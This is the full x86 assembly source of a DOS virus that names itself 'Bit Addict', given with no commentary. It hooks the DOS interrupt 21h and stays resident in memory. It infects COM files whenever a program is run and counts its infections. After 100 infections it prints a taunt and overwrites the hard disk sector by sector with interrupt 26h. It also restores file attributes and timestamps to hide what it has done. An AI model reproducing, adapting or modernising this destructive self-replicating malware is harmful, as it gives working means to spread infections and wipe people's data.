code segment
	org	0

	call	Virus

Displacement	equ	$

SavedCode	db	0cdh,020h,11 dup (090h)

OldInt21	dd	0
Count		db	0

Jump		db	0e9h
NearOfset	dw	0
ID		db	'Bit Addict says: ',13,10
		db	'"You have a good taste for hard disks, it was delicious!"'
		db	'$'

NewInt21:
	cmp	ax,0ffffh
	jne	Ok
	cmp	dx,ax
	jne	Ok
	mov	ax,cs
	iret
Ok:	cmp	ah,4bh
	je	Exec
	jmp	EOI

Exec:	cmp	cs:Count,100
	jb	Infect

	push	cs
	pop	ds
	mov	ah,9
	lea	dx,ID
	int	21h

	xor	dx,dx
	cli
Repeat:	push	dx
	mov	ax,2
	xor	bx,bx
	mov	cx,100
	int	26h
	pop	ax
	pop	dx
	add	dx,100
	jmp	short Repeat

Infect:	push	ax
	push	bx
	push	cx
	push	si
	push	di
	push	ds
	push	es
	push	dx
	mov	ax,04300h
	int	21h
	push	cx
	mov	ax,04301h
	xor	cx,cx
	int	21h
	mov	ax,03d02h
	int	21h
	jnc	OpenOk
	jmp	Error
OpenOk:	mov	bx,ax
	mov	ax,05700h
	int	21h
	push	cx
	push	dx
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	ah,3fh
	mov	cx,13
	lea	dx,SavedCode
	int	21h
	jc	Close2
	lea	si,ID
	lea	di,SavedCode[3]
	mov	cx,10
	cld
	repe	cmpsb
	je	Counter
	cmp	word ptr SavedCode,5a4dh
	je	Close2
	mov	ax,04202h
	xor	cx,cx
	xor	dx,dx
	int	21h
	jc	Close
	or	dx,dx
	jne	Close
	sub	ax,3
	jb	Close
	mov	NearOfset,ax
	mov	Count,0
	mov	ah,40h
	mov	cx,CodeSize
	xor	dx,dx
	int	21h
	jc	Close
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	int	21h
	jc	Close
	mov	ah,40h
	mov	cx,13
	lea	dx,Jump
	int	21h
Close2:	jmp	short Close
Counter:mov	dx,word ptr SavedCode[1]
	add	dx,offset Count+3
	xor	cx,cx
	mov	ax,4200h
	int	21h
	jc	Close
	push	ax
	push	dx
	mov	ah,3fh
	mov	cx,1
	lea	dx,Count
	int	21h
	pop	cx
	pop	dx
	jc	Close
	inc	Count
	mov	ax,4200h
	int	21h
	jc	Close
	mov	ah,40h
	mov	cx,1
	lea	dx,Count
	int	21h
Close:	pop	dx
	pop	cx
	mov	ax,05701h
	int	21h
	mov	ax,03e00h
	int	21h
Error:	pop	cx
	pop	dx
	pop	es
	pop	ds
	mov	ax,04301h
	int	21h
	pop	di
	pop	si
	pop	cx
	pop	bx
	pop	ax
EOI:	jmp	cs:OldInt21

Virus:	mov	ax,0ffffh
	mov	dx,ax
	int	21h
	pop	bx
	sub	bx,Displacement
	mov	ds,ax
	xor	si,si
	mov	di,bx
	mov	cx,CodeSize
	rep	cmpsb
	je	Exit
	push	bx
	mov	ah,52h
	int	21h
	push	es
	push	bx
	mov	ah,30h
	int	21h
	pop	si
	pop	ds
	pop	bx
	cmp	al,2
	jb	Exit
	cmp	al,3
	adc	si,12h
	les	di,[si]
	push	es
	push	di
	les	di,es:[di]
	mov	[si],di
	mov	[si+2],es
	pop	ax
	pop	dx
	add	ax,0fh
	mov	cl,4
	shr	ax,cl
	add	ax,dx
	mov	es,ax
	push	cs
	pop	ds
	mov	si,bx
	xor	di,di
	mov	cx,CodeSize
	cld
	rep	movsb
	xor	ax,ax
	mov	ds,ax
	mov	ax,[84h]
	mov	es:word ptr OldInt21[0],ax
	mov	ax,[86h]
	mov	es:word ptr OldInt21[2],ax
	mov	word ptr [84h],NewInt21
	mov	word ptr [86h],es
Exit:	push	cs
	pop	es
	push	cs
	pop	ds
	lea	si,SavedCode[bx]
	mov	di,0100h
	push	di
	mov	cx,13
	rep	movsb
	ret

CodeSize	equ	$
